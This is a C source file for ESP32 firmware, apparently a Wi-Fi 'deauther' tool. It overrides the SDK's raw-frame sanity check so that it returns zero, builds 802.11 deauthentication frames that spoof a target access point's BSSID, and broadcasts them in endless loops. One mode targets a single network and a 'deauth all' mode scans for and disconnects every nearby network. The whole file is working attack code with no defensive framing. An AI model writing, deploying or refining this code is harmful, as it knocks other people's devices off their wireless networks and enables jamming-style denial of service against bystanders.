#include <string.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "config.h"

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

#define TAG "WiFi_Deauther"
#define DEAUTH_REPEAT 20

static TaskHandle_t deauth_task_handle = NULL;
static TaskHandle_t deauth_all_task_handle = NULL;

static const uint8_t deauth_frame_template[] = {
    0xc0, 0x00,
    0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
}

void wifi_deauth_task(void *pvParameters) {
    wifi_ap_record_t *ap_record = pvParameters;

    uint8_t deauth_frame[sizeof(deauth_frame_template)];
    memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame_template));

    memcpy(deauth_frame + 10, ap_record->bssid, 6);
    memcpy(deauth_frame + 16, ap_record->bssid, 6);

    ESP_LOGI(TAG, "Built deauth frame, starting deauth loop...");

    while (1) {
        for (int i = 0; i < DEAUTH_REPEAT; i++) {
            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        ESP_LOGI(TAG, "Sent %d deauth packets", DEAUTH_REPEAT);
        vTaskDelay(pdMS_TO_TICKS(1000));
    }
}

void start_deauth_task(wifi_ap_record_t *ap_info) {
    if (deauth_task_handle != NULL) {
        ESP_LOGW(TAG, "Deauth task already running");
        return;
    }

    wifi_ap_record_t *ap_record = pvPortMalloc(sizeof(wifi_ap_record_t));
    if (ap_record == NULL) {
        ESP_LOGE(TAG, "Memory allocation failed");
        return;
    }

    memcpy(ap_record, ap_info, sizeof(wifi_ap_record_t));
    if (xTaskCreate(&wifi_deauth_task, "wifi_deauth_task", 4096, ap_record, 5, &deauth_task_handle) != pdPASS) {
        ESP_LOGE(TAG, "Task creation failed");
        vPortFree(ap_record);
    }
}

void stop_deauth_task(void) {
    if (deauth_task_handle != NULL) {
        vTaskDelete(deauth_task_handle);
        deauth_task_handle = NULL;
        ESP_LOGI(TAG, "Deauth task stopped");
    }
}

void wifi_deauth_all_task(void *pvParameters) {
    ESP_LOGI(TAG, "Starting deauth all mode");

    while (1) {
        wifi_scan_config_t scan_config = { .scan_type = WIFI_SCAN_TYPE_ACTIVE };
        esp_wifi_scan_start(&scan_config, true);

        uint16_t ap_count = 0;
        esp_wifi_scan_get_ap_num(&ap_count);

        if (ap_count == 0) {
            ESP_LOGI(TAG, "No APs found, rescanning...");
            vTaskDelay(pdMS_TO_TICKS(5000));
            continue;
        }

        wifi_ap_record_t *ap_records = pvPortMalloc(ap_count * sizeof(wifi_ap_record_t));
        if (!ap_records) {
            vTaskDelay(pdMS_TO_TICKS(5000));
            continue;
        }

        esp_wifi_scan_get_ap_records(&ap_count, ap_records);
        ESP_LOGI(TAG, "Deauthing %d APs, %d waves", ap_count, DEAUTH_REPEAT);

        uint8_t deauth_frame[sizeof(deauth_frame_template)];
        memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame_template));

        for (int wave = 0; wave < DEAUTH_REPEAT; wave++) {
            for (int i = 0; i < ap_count; i++) {
                esp_wifi_set_channel(ap_records[i].primary, WIFI_SECOND_CHAN_NONE);

                memcpy(deauth_frame + 10, ap_records[i].bssid, 6);
                memcpy(deauth_frame + 16, ap_records[i].bssid, 6);

                wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
                vTaskDelay(pdMS_TO_TICKS(5));
            }
            vTaskDelay(pdMS_TO_TICKS(20));
        }

        ESP_LOGI(TAG, "Completed %d deauth waves across %d APs", DEAUTH_REPEAT, ap_count);

        vPortFree(ap_records);
        vTaskDelay(pdMS_TO_TICKS(500));
    }
}

void start_deauth_all_task(void) {
    if (deauth_all_task_handle != NULL) {
        ESP_LOGW(TAG, "Deauth all task already running");
        return;
    }

    xTaskCreate(&wifi_deauth_all_task, "deauth_all", 4096, NULL, 5, &deauth_all_task_handle);
    ESP_LOGI(TAG, "Deauth all task created");
}

void stop_deauth_all_task(void) {
    if (deauth_all_task_handle != NULL) {
        vTaskDelete(deauth_all_task_handle);
        deauth_all_task_handle = NULL;
        ESP_LOGI(TAG, "Deauth all task stopped");
    }
}
